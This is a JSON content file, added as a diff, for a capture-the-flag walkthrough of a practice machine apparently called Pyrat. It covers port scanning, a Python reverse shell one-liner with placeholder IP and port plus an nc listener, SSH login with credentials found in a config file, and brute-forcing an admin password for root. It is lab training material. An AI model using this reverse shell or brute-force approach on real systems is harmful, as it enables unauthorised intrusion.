@@ -1,0 +1,230 @@
+[
+      {
+        "type": "section_heading",
+        "id": "initial-access",
+        "text": "Initial Access"
+      },
+      {
+        "type": "paragraph",
+        "id": "nmap-intro",
+        "text": "We start by scanning the target with Nmap."
+      },
+      {
+        "type": "code_block",
+        "id": "nmap-command",
+        "language": "bash",
+        "code": "nmap -p- -T4 -A -v 10.49.172.22"
+      },
+      {
+        "type": "image",
+        "id": "nmap-scan-screenshot",
+        "src": "/assets/walkthroughs/pyrat/nmap.png",
+        "alt": "Nmap scan result"
+      },
+      {
+        "type": "paragraph",
+        "id": "further-details",
+        "text": "As we can see, we found two ports: `http` and `ssh`. Since `ssh` requires credentials, we will leave it for now and focus on `http`."
+      },
+      {
+        "type": "section_heading",
+        "id": "further-enumeration",
+        "text": "Further Enumeration"
+      },
+      {
+        "type": "paragraph",
+        "id": "further-enumeration",
+        "text": "Then we visited website on the following url."
+      },
+      {
+        "type": "code_block",
+        "id": "url",
+        "language": "bash",
+        "code": "http://10.49.172.22:8000/"
+      },
+      {
+        "type": "image",
+        "id": "ui-scan-screenshot",
+        "src": "/assets/walkthroughs/pyrat/basic-connection.png",
+        "alt": "Nmap scan result"
+      },
+      {
+        "type": "paragraph",
+        "id": "further-details",
+        "text": "We can see it says, try a more basic conection so we will go with it and try to access it with a basic connection."
+      },
+      {
+        "type": "code_block",
+        "id": "url",
+        "language": "bash",
+        "code": "nc 10.49.172.22 8000"
+      },
+      {
+        "type": "image",
+        "id": "nc-scan-screenshot",
+        "src": "/assets/walkthroughs/pyrat/python.png",
+        "alt": "Nc scan result"
+      },
+      {
+        "type": "paragraph",
+        "id": "further-details",
+        "text": "As we can see we got something like shell but it can only execute python code so now in next step we will setup a reverse shell."
+      },
+      {
+        "type": "section_heading",
+        "id": "reverse-shell",
+        "text": "Reverse Shell"
+      },
+      {
+        "type": "paragraph",
+        "id": "reverse-shell",
+        "text": "Now we will setup reverse shell, so first we need python reverse shell so for this we will go to https://www.revshells.com "
+      },
+      {
+        "type": "code_block",
+        "id": "url",
+        "language": "bash",
+        "code": "import socket,os,pty;s=socket.socket();s.connect(('IP',PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/bash')"
+      },
+      {
+        "type": "paragraph",
+        "id": "further-details",
+        "text": "Remember to use your IP and PORT instead of the placeholders in the above command and before executing this open a listener in another tab by writing below command."
+      },
+      {
+        "type": "code_block",
+        "id": "url",
+        "language": "bash",
+        "code": "nc -lvnp PORT"
+      },
+      {
+        "type": "image",
+        "id": "shell-scan-screenshot",
+        "src": "/assets/walkthroughs/pyrat/www-data.png",
+        "alt": "Shell"
+      },
+      {
+        "type": "paragraph",
+        "id": "further-details",
+        "text": "So as we can see we gained intital foothold and now we will check files and look for something which can give us any user access."
+      },
+      {
+        "type": "image",
+        "id": "shell-scan-screenshot",
+        "src": "/assets/walkthroughs/pyrat/shell.png",
+        "alt": "Shell"
+      },
+      {
+        "type": "paragraph",
+        "id": "further-details",
+        "text": "After enumerating we got a config file and upon viewing it we got username and password."
+      },
+      {
+        "type": "section_heading",
+        "id": "ssh",
+        "text": "SSH"
+      },
+      {
+        "type": "paragraph",
+        "id": "ssh-access",
+        "text": "Now we will access into system via SSH and the credientials we got."
+      },
+      {
+        "type": "code_block",
+        "id": "url",
+        "language": "bash",
+        "code": "ssh user@10.49.172.22"
+      },
+      {
+        "type": "image",
+        "id": "shell-scan-screenshot",
+        "src": "/assets/walkthroughs/pyrat/shell.png",
+        "alt": "Shell"
+      },
+      {
+        "type": "section_heading",
+        "id": "user-flag",
+        "text": "User Flag"
+      },
+      {
+        "type": "paragraph",
+        "id": "user-access",
+        "text": "With this we access user flag."
+      },
+      {
+        "type": "image",
+        "id": "user-flag",
+        "src": "/assets/walkthroughs/pyrat/userflag.png",
+        "alt": "User flag"
+      },
+      {
+        "type": "section_heading",
+        "id": "root-flag",
+        "text": "Root Flag"
+      },
+      {
+        "type": "paragraph",
+        "id": "root-access",
+        "text": "Ok so for root flag we will start by checking out files first"
+      },
+      {
+        "type": "image",
+        "id": "user-flag",
+        "src": "/assets/walkthroughs/pyrat/understanding.png",
+        "alt": "User flag"
+      },
+      {
+        "type": "paragraph",
+        "id": "root-access",
+        "text": "So here upon viewing gitconfig file we see it is referring to another directory which is /opt, so we will go there and check it."
+      },
+      {
+        "type": "image",
+        "id": "user-flag",
+        "src": "/assets/walkthroughs/pyrat/file.png",
+        "alt": "User flag"
+      },
+      {
+        "type": "paragraph",
+        "id": "root-access",
+        "text": "So we restored a file and lets try to understand it."
+      },
+      {
+        "type": "paragraph",
+        "id": "root-access",
+        "text": "So basically it is checking that if socket is admin or not so we know that we need to access it from admin and then we will write shell which will give us root shell, now will use a script which will bruteforce the password."
+      },
+      {
+        "type": "image",
+        "id": "user-flag",
+        "src": "/assets/walkthroughs/pyrat/password.png",
+        "alt": "User flag"
+      },
+      {
+        "type": "paragraph",
+        "id": "root-access",
+        "text": "Now what we will do is to run this file, you can get this code from this url: https://github.com/Azid-ops/Important-Material---THM/blob/main/shell.py"
+      },
+      {
+        "type": "image",
+        "id": "user-flag",
+        "src": "/assets/walkthroughs/pyrat/abc.png",
+        "alt": "User flag"
+      },
+      {
+        "type": "paragraph",
+        "id": "root-access",
+        "text": "So now we got the password and now remember admin is not any user but it is used in simple authentication so we just use that."
+      },
+      {
+        "type": "image",
+        "id": "root-flag",
+        "src": "/assets/walkthroughs/pyrat/root.png",
+        "alt": "Root flag"
+      },
+      {
+        "type": "paragraph",
+        "id": "root-access",
+        "text": "With data we logged in with normal admin user, which was supported in basic authentication and we wrote shell we got this information from the file we got before and in last we got the flag, thats it."
+      }
+    ]
